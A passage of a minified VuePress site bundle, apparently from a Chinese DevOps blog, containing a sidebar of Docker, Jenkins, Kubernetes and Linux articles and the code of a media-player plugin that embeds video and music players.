命令及基本使用","/docker/401"],["40.Docker/402.Docker私有库的开发.md","Docker私有库的开发","/docker/402"]]},{title:"Jenkins",collapsable:!1,children:[["50.Jenkins/500.Jenkins(一) 持续集成及Jenkins介绍.md","Jenkins(一) 持续集成及Jenkins介绍","/jenkins/500"],["50.Jenkins/501.Jenkins(二) Jenkins安装和环境配置.md","Jenkins(二) Jenkins安装和环境配置","/jenkins/501"],["50.Jenkins/502.Jenkins(三) Jenkins用户管理及凭证.md","Jenkins(三) Jenkins用户管理及凭证","/jenkins/502"],["50.Jenkins/503.Jenkins(四) Maven安装和配置.md","Jenkins(四) Maven安装和配置","/jenkins/503"],["50.Jenkins/504.Jenkins(五) Jenkins构建Maven项目.md","Jenkins(五) Jenkins构建Maven项目","/jenkins/504"],["50.Jenkins/505.Jenkins(六) Jenkins项目构建细节.md","Jenkins(六) Jenkins项目构建细节","/jenkins/505"],["50.Jenkins/506.Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）.md","Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）","/jenkins/506"],["50.Jenkins/507.Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）.md","Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）","/jenkins/507"]]},{title:"Kubernetes",collapsable:!1,children:[["60.Kubernetes/600.kubernetes(一) 概念及介绍.md","kubernetes(一) 概念及介绍","/kubernetes/600"],["60.Kubernetes/601.kubernetes(二) 集群环境搭建.md","kubernetes(二) 集群环境搭建","/kubernetes/601"],["60.Kubernetes/602.kubernetes(三) 资源管理.md","kubernetes(三) 资源管理","/kubernetes/602"],["60.Kubernetes/603.kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍.md","kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍","/kubernetes/603"],["60.Kubernetes/604.kubernetes(五) Pod 介绍及配置.md","kubernetes(五) Pod 介绍及配置","/kubernetes/604"],["60.Kubernetes/605.kubernetes(六) Pod 生命周期.md","kubernetes(六) Pod 生命周期","/kubernetes/605"],["60.Kubernetes/606.kubernetes(七) Pod 调度.md","kubernetes(七) Pod 调度","/kubernetes/606"],["60.Kubernetes/607.kubernetes(八) Pod 控制器详解.md","kubernetes(八) Pod 控制器详解","/kubernetes/607"],["60.Kubernetes/608.kubernetes(九) Service介绍、类型及使用.md","kubernetes(九) Service介绍、类型及使用","/kubernetes/608"],["60.Kubernetes/609.kubernetes(十) Ingress介绍及使用.md","kubernetes(十) Ingress介绍及使用","/kubernetes/609"],["60.Kubernetes/610.kubernetes(十一) 数据存储（挂载卷管理）.md","kubernetes(十一) 数据存储（挂载卷管理）","/kubernetes/610"],["60.Kubernetes/611.kubernetes(十二) 安全认证.md","kubernetes(十二) 安全认证","/kubernetes/611"],["60.Kubernetes/612.kubernetes(十三) DashBoard.md","kubernetes(十三) DashBoard","/kubernetes/612"]]},{title:"linux",collapsable:!1,children:[["2300.linux/2300.Linux 创建用户及权限操作.md","linux 创建用户及权限操作","/linux/2300"],["2300.linux/2301.Linux 磁盘操作相关命令.md","Linux 磁盘操作相关命令","/linux/2301"],["2300.linux/2302.Linux 文本数据处理工具awk命令.md","Linux 文本数据处理工具awk命令","/linux/2302"],["2300.linux/2303.Linux 定时任务.md","Linux 定时任务","/linux/2303"],["2300.linux/2304.Linux 命令总结.md","Linux 命令总结","/linux/2304"],["2300.linux/2305.Linux 22端口对外攻击解决.md","Linux 22端口对外攻击解决","/linux/2305"]]}]},extendFrontmatter:{article:!1},updateBar:{showToArticle:!1,moreArticle:"/archives"},social:{icons:[{iconClass:"icon-gitee",title:"gitee",link:"https://gitee.com/dashboard"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/landashu?tab=repositories"},{iconClass:"icon-youjian",title:"发邮件",link:"mailto:875730567@qq.com"}]},footer:{createYear:2023,copyrightInfo:"\n\x3c!--      <a href='https://doc.xugaoyi.com/' target='_blank'>Theme by Vdoing</a> | <a href='http://doc.aizuda.com/' rel='external nofollow' target='_blank'>Copyright © 2022-2023 AiZuDa</a>--\x3e\n\x3c!--      <br>--\x3e\n\x3c!--      <a href=\"http://beian.miit.gov.cn/\" target=\"_blank\">鲁ICP备2021041554号-1</a>--\x3e\n    "}}},Xs=(t(116),t(213),t(111),t(223)),Ys=t(224),Qs=(t(377),t(158),t(52));var Zs={computed:{$filterPosts:function(){return this.$site.pages.filter((function(n){var e=n.frontmatter,t=e.pageComponent,r=e.article,a=e.home;return!(t||!1===r||!0===a)}))},$sortPosts:function(){return(n=this.$filterPosts).sort((function(n,e){var t=n.frontmatter.sticky,r=e.frontmatter.sticky;return t&&r?t==r?Object(Qs.a)(n,e):t-r:t&&!r?-1:!t&&r?1:Object(Qs.a)(n,e)})),n;var n},$sortPostsByDate:function(){return(n=this.$filterPosts).sort((function(n,e){return Object(Qs.a)(n,e)})),n;var n},$groupPosts:function(){return function(n){for(var e={},t={},r=function(r,a){var o=n[r].frontmatter,i=o.categories,s=o.tags;"array"===Object(Qs.n)(i)&&i.forEach((function(t){t&&(e[t]||(e[t]=[]),e[t].push(n[r]))})),"array"===Object(Qs.n)(s)&&s.forEach((function(e){e&&(t[e]||(t[e]=[]),t[e].push(n[r]))}))},a=0,o=n.length;a<o;a++)r(a);return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags:function(){return function(n){var e=[],t=[];for(var r in n.categories)e.push({key:r,length:n.categories[r].length});for(var a in n.tags)t.push({key:a,length:n.tags[a].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Ba.component(Xs.default),Ba.component(Ys.default);function nl(n){return n.toString().padStart(2,"0")}t(381);Ba.component("Badge",(function(){return Promise.all([t.e(1),t.e(12)]).then(t.bind(null,582))})),Ba.component("CodeBlock",(function(){return Promise.resolve().then(t.bind(null,223))})),Ba.component("CodeGroup",(function(){return Promise.resolve().then(t.bind(null,224))}));t(382);var el=Ba.extend({props:{bvid:{type:String,default:{page:1,danmaku:!0,allowfullscreen:"allowfullscreen",sandbox:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",width:"100%",height:[.5625,70]}.bvid,required:!0},danmaku:{type:Boolean,default:!0,required:!1},page:{type:Number,default:1,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,70]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//player.bilibili.com/player.html?bvid=".concat(this.bvid,"&page=").concat(this.page,"&danmaku=").concat(this.danmaku),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),tl=Ba.extend({props:{xid:{type:String,default:null,required:!0},id:{type:String,default:null,required:!1},autoplay:{type:Boolean,default:!1,required:!1},startTime:{type:Number,default:0,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//www.ixigua.com/iframe/".concat(this.xid,"?").concat(this.id?"id="+this.id+"&":"","autoplay=").concat(this.autoplay?1:0,"&startTime=").concat(this.startTime),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),rl=t(23),al=t(17),ol=(t(106),t(151),function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(6).then(t.t.bind(null,475,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,l,c,p,d,u,m,g,f,h,b,v,y,k,x,w,S,j,E,A,T,_,I,C,P,R,B,O;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(m=r.default,g=!1,f=!1,h=!1,b=!1,v=!1,e.src.video.customType=(null===(a=e.src)||void 0===a||null===(o=a.video)||void 0===o?void 0:o.customType)||{},null!==(i=e.src)&&void 0!==i&&null!==(s=i.video)&&void 0!==s&&s.type||(null!==(y=e.src)&&void 0!==y&&null!==(k=y.video)&&void 0!==k&&k.url.toLowerCase().endsWith(".m3u8")?e.src.video.type="hls":null!==(x=e.src)&&void 0!==x&&null!==(w=x.video)&&void 0!==w&&w.url.toLowerCase().endsWith(".flv")?e.src.video.type="flv":null!==(S=e.src)&&void 0!==S&&null!==(j=S.video)&&void 0!==j&&j.url.toLowerCase().endsWith(".mpd")&&(e.src.video.type="shakaDash")),null===(l=e.src)||void 0===l||null===(c=l.video)||void 0===c||!c.type||"string"!=typeof e.src.video.type){n.next=27;break}n.t0=e.src.video.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.video.type="smplayerDplayerHls",g=!0,n.abrupt("break",27);case 15:return e.src.video.type="smplayerDplayerFlv",f=!0,n.abrupt("break",27);case 18:return e.src.video.type="smplayerDplayerDash",h=!0,n.abrupt("break",27);case 21:return e.src.video.type="smplayerDplayerShakaDash",b=!0,n.abrupt("break",27);case 24:return e.src.video.type="smplayerDplayerWebtorrent",v=!0,n.abrupt("break",27);case 27:if(null!=(null===(p=e.src)||void 0===p||null===(d=p.video)||void 0===d?void 0:d.quality)&&e.src.video.quality.length>0&&e.src.video.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerDplayerHls",g=!0;break;case"flv":n.type="smplayerDplayerFlv",f=!0;break;case"dash":n.type="smplayerDplayerDash",h=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerDplayerShakaDash",b=!0;break;case"webtorrent":n.type="smplayerDplayerWebtorrent",v=!0}})),g&&Object.assign(null===(E=e.src)||void 0===E||null===(A=E.video)||void 0===A?void 0:A.customType,{smplayerDplayerHls:function(n,e){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var r=t.default,a=n.src,o=new r;o.attachMedia(n),o.on(r.Events.MEDIA_ATTACHED,(function(){o.loadSource(a)})),e.on("destroy",(function(){o.destroy()}))}))}}),f&&Object.assign(null===(T=e.src)||void 0===T||null===(_=T.video)||void 0===_?void 0:_.customType,{smplayerDplayerFlv:function(n,e){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var r=t.default.createPlayer({type:"flv",url:n.src});r.attachMediaElement(n),r.load(),e.on("destroy",(function(){r.destroy()}))}))}}),h&&Object.assign(null===(I=e.src)||void 0===I||null===(C=I.video)||void 0===C?void 0:C.customType,{smplayerDplayerDash:function(n,e){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var r=t.default.MediaPlayer().create();r.initialize(n,n.src,!1),e.on("destroy",(function(){r.reset()}))}))}}),b&&Object.assign(null===(P=e.src)||void 0===P||null===(R=P.video)||void 0===R?void 0:R.customType,{smplayerDplayerShakaDash:function(n,e){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var r=new t.default.Player(n);r.load(n.src).then((function(){e.on("destroy",(function(){r.destroy()}))}))}))}}),v&&Object.assign(null===(B=e.src)||void 0===B||null===(O=B.video)||void 0===O?void 0:O.customType,{smplayerDplayerWebtorrent:function(n,e){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var r=new(0,t.default);r.add(n.src,(function(t){t.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),e.on("destroy",(function(){r.destroy()}))}))}))}}),null===(u=e.src)||void 0===u||!u.customInit){n.next=39;break}return n.next=36,e.src.customInit(m,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new m(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),il=t(24),sl=t.n(il),ll=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{container:null},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sl()({},n.on),r=Object(rl.a)(Object(rl.a)({},sl()({container:null},n.src)),{},{container:n.$refs.sbplayer}),n.player=new ol(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),cl=(t(107),function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,Promise.all([Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,481,7)),Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,482,7))]).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,l,c,p,d;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(l=Object(Ki.a)(r,1),c=l[0].default,e.src.customAudioType=(null===(a=e.src)||void 0===a?void 0:a.customAudioType)||{},p=!1,null===(o=e.src)||void 0===o||null===(i=o.audio)||void 0===i||i.forEach((function(n){if(n.type||n.url.toLowerCase().endsWith(".m3u8")&&(n.type="hls"),n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerAplayerHls",p=!0}})),p&&Object.assign(null===(d=e.src)||void 0===d?void 0:d.customAudioType,{smplayerAplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var a=t.default,o=!1===r.audio.paused;if(n.canPlayType("application/x-mpegURL")||n.canPlayType("application/vnd.apple.mpegURL"))n.src=e.url;else if(a.isSupported()){var i=new a;i.attachMedia(n),i.on(a.Events.MEDIA_ATTACHED,(function(){i.loadSource(e.url)})),r.on("destroy",(function(){i.destroy()}))}else r.notice("Error: HLS is not supported.");o&&r.play()}))}}),null===(s=e.src)||void 0===s||!s.customInit){n.next=11;break}return n.next=8,e.src.customInit(c,e.src).then((function(n){return e.player=n,e.player}));case 8:n.t0=n.sent,n.next=12;break;case 11:n.t0=new c(e.src);case 12:return e.player=n.t0,n.abrupt("return",e.player);case 14:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;!this.player||null!==(n=this.src)&&void 0!==n&&n.fixed||this.player.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),pl=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sl()({},n.on),r=Object(rl.a)(Object(rl.a)({},sl()({lrcType:3},n.src)),{},{container:n.$refs.sbplayer}),n.player=new cl(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t),n.$nextTick((function(){if(n.src.fixed){var e=document.querySelector("#app");null==e||e.append(n.$el)}}));case 7:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),dl=function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(4).then(t.t.bind(null,483,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,l,c,p,d,u,m,g,f,h,b,v,y,k,x,w,S,j,E;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(c=r.default,p=!1,d=!1,u=!1,m=!1,g=!1,e.src.customType=(null===(a=e.src)||void 0===a?void 0:a.customType)||{},null!==(o=e.src)&&void 0!==o&&o.type||(null!==(f=e.src)&&void 0!==f&&null!==(h=f.url)&&void 0!==h&&h.toLowerCase().endsWith(".m3u8")?e.src.type="hls":null!==(b=e.src)&&void 0!==b&&null!==(v=b.url)&&void 0!==v&&v.toLowerCase().endsWith(".flv")?e.src.type="flv":null!==(y=e.src)&&void 0!==y&&null!==(k=y.url)&&void 0!==k&&k.toLowerCase().endsWith(".mpd")&&(e.src.type="shakaDash")),null===(i=e.src)||void 0===i||!i.type||"string"!=typeof e.src.type){n.next=27;break}n.t0=e.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.type="smplayerArtplayerHls",p=!0,n.abrupt("break",27);case 15:return e.src.type="smplayerArtplayerFlv",d=!0,n.abrupt("break",27);case 18:return e.src.type="smplayerArtplayerDash",u=!0,n.abrupt("break",27);case 21:return e.src.type="smplayerArtplayerShakaDash",m=!0,n.abrupt("break",27);case 24:return e.src.type="smplayerArtplayerWebtorrent",g=!0,n.abrupt("break",27);case 27:if(null!=(null===(s=e.src)||void 0===s?void 0:s.quality)&&e.src.quality.length>0&&e.src.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerArtplayerHls",p=!0;break;case"flv":n.type="smplayerArtplayerFlv",d=!0;break;case"dash":n.type="smplayerArtplayerDash",u=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerArtplayerShakaDash",m=!0;break;case"webtorrent":n.type="smplayerArtplayerWebtorrent",g=!0}})),p&&Object.assign(null===(x=e.src)||void 0===x?void 0:x.customType,{smplayerArtplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var a=t.default,o=new a;o.attachMedia(n),o.on(a.Events.MEDIA_ATTACHED,(function(){o.loadSource(e)})),r.on("destroy",(function(){o.destroy()}))}))}}),d&&Object.assign(null===(w=e.src)||void 0===w?void 0:w.customType,{smplayerArtplayerFlv:function(n,e,r){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var a=t.default.createPlayer({type:"flv",url:e});a.attachMediaElement(n),a.load(),r.on("destroy",(function(){a.destroy()}))}))}}),u&&Object.assign(null===(S=e.src)||void 0===S?void 0:S.customType,{smplayerArtplayerDash:function(n,e,r){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var a=t.default.MediaPlayer().create();a.initialize(n,e,!1),r.on("destroy",(function(){a.reset()}))}))}}),m&&Object.assign(null===(j=e.src)||void 0===j?void 0:j.customType,{smplayerArtplayerShakaDash:function(n,e,r){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var a=new t.default.Player(n);a.load(e).then((function(){r.on("destroy",(function(){a.destroy()}))}))}))}}),g&&Object.assign(null===(E=e.src)||void 0===E?void 0:E.customType,{smplayerArtplayerWebtorrent:function(n,e,r){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var a=new(0,t.default);a.add(e,(function(e){e.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),r.on("destroy",(function(){a.destroy()}))}))}))}}),null===(l=e.src)||void 0===l||!l.customInit){n.next=39;break}return n.next=36,e.src.customInit(c,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new c(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),ul=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$refs.sbplayer,r=sl()({},n.on),a=Object(rl.a)(Object(rl.a)({},sl()({url:"",fullscreen:!0,autoSize:!0,setting:!0,playbackRate:!0,whitelist:["*"],moreVideoAttr:{preload:"auto"}},n.src)),{},{container:t}),n.player=new dl(a),e.next=6,n.player.InitPlayer();case 6:n.player.AddOnEvent(r),t.style.height=t.scrollWidth*n.height[0]+n.height[1]+"px";case 8:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}});t(216);function ml(n,e){return(ml=Object.setPrototypeOf||function(n,e){return n.__proto__=e,n})(n,e)}function gl(n,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");n.prototype=Object.create(e&&e.prototype,{constructor:{value:n,writable:!0,configurable:!0}}),Object.defineProperty(n,"prototype",{writable:!1}),e&&ml(n,e)}t(217),t(218);function fl(n){return(fl=Object.setPrototypeOf?Object.getPrototypeOf:function(n){return n.__proto__||Object.getPrototypeOf(n)})(n)}function hl(n,e){if(e&&("object"===Ai(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return function(n){if(void 0===n)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return n}(n)}function bl(n){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(n){return!1}}();return function(){var t,r=fl(n);if(e){var a=fl(this).constructor;t=Reflect.construct(r,arguments,a)}else t=r.apply(this,arguments);return hl(this,t)}}t(238),t(239);var vl=function(n){gl(a,n);var e,t=bl(a);function a(){return cs(this,a),t.call(this)}return ds(a,[{key:"InitMeting",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,t,a,o,i,s,l=this,c=arguments;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return e=c.length>0&&void 0!==c[0]?c[0]:{},t=c.length>1?c[1]:void 0,a=[],o=e.audio||[],i=e.list||[],(e.id||e.auto)&&(i=[{id:e.id,server:e.server,type:e.type,auth:e.auth,auto:e.auto}].concat(i.map((function(n){return{id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto}})))),i&&i.length>0&&i.map((function(n){if(n.id||n.auto){var t=l.ParseMeting({id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto},e.api);t&&a.push(t)}})),s=a.map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return n.next=2,fetch(e);case 2:return n.abrupt("return",n.sent.json());case 3:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()),n.next=10,Promise.all(s).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return r.map((function(n){o=o.concat(n.map((function(n){return{name:(null==n?void 0:n.name)||(null==n?void 0:n.title)||"Audio name",artist:(null==n?void 0:n.artist)||(null==n?void 0:n.author)||"Audio artist",url:null==n?void 0:n.url,cover:(null==n?void 0:n.cover)||(null==n?void 0:n.pic),lrc:(null==n?void 0:n.lrc)||(null==n?void 0:n.lyric)||"",type:(null==n?void 0:n.type)||"auto"}})))})),a={container:t,audio:o,fixed:e.fixed,mini:e.mini,autoplay:e.autoplay,loop:e.loop,order:e.order,preload:e.preload,volume:e.volume,mutex:e.mutex,lrcType:e.lrcType,listFolded:e.listFolded,listMaxHeight:e.listMaxHeight,storageName:e.storageName},l.src=a,n.abrupt("return",l.InitPlayer());case 4:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 10:return n.abrupt("return",n.sent);case 11:case"end":return n.stop()}}),n)}))),function(){return e.apply(this,arguments)})},{key:"ParseMeting",value:function(n,e){return n&&n.auto&&(n=this.ParseLink(n.auto)),n&&n.server&&n.type&&n.id?e.replace(":server",n.server).replace(":type",n.type).replace(":id",n.id).replace(":auth",n.auth).replace(":r",Math.random().toString()):""}},{key:"ParseLink",value:function(n){for(var e=0,t=[["music.163.com.*song.*id=(\\d+)","netease","song"],["music.163.com.*album.*id=(\\d+)","netease","album"],["music.163.com.*artist.*id=(\\d+)","netease","artist"],["music.163.com.*playlist.*id=(\\d+)","netease","playlist"],["music.163.com.*discover/toplist.*id=(\\d+)","netease","playlist"],["y.qq.com.*song/(\\w+).html","tencent","song"],["y.qq.com.*songDetail/(\\w+)","tencent","song"],["y.qq.com.*album/(\\w+).html","tencent","album"],["y.qq.com.*singer/(\\w+).html","tencent","artist"],["y.qq.com.*playsquare/(\\w+).html","tencent","playlist"],["y.qq.com.*playlist/(\\w+).html","tencent","playlist"],["xiami.com.*song/(\\w+)","xiami","song"],["xiami.com.*album/(\\w+)","xiami","album"],["xiami.com.*artist/(\\w+)","xiami","artist"],["xiami.com.*collect/(\\w+)","xiami","playlist"]];e<t.length;e++){var r=t[e],a=new RegExp(r[0]).exec(n);if(a)return{server:r[1],type:r[2],id:a[1]}}return console.error("无法解析的链接: ".concat(n,"，请检查链接是否书写正确")),{}}}]),a}(cl),yl=Ba.extend({props:{id:{required:!1,type:String,default:""},server:{required:!1,type:String,default:"tencent"},type:{required:!1,type:String,default:"song"},auto:{required:!1,type:String,default:""},fixed:{required:!1,type:Boolean,default:!1},mini:{required:!1,type:Boolean,default:!1},autoplay:{required:!1,type:Boolean,default:!1},theme:{required:!1,type:String,default:"#2980b9"},loop:{required:!1,type:String,default:"all"},order:{required:!1,type:String,default:"list"},preload:{required:!1,type:String,default:"auto"},volume:{required:!1,type:Number,default:.7},mutex:{required:!1,type:Boolean,default:!0},lrcType:{required:!1,type:Number,default:3},listFolded:{required:!1,type:Boolean,default:!1},listMaxHeight:{required:!1,type:String,default:"340px"},storageName:{required:!1,type:String,default:"vuepress-plugin-smplayer"},api:{required:!1,type:String,default:"https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&r=:r"},audio:{required:!1,type:Array},list:{required:!1,type:Array}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{meting:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$props,n.meting=new vl,e.next=4,n.meting.InitMeting(t,n.$refs.sbplayer);case 4:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.meting)||void 0===n||n.DestroyPlayer()}}),kl=function(){function 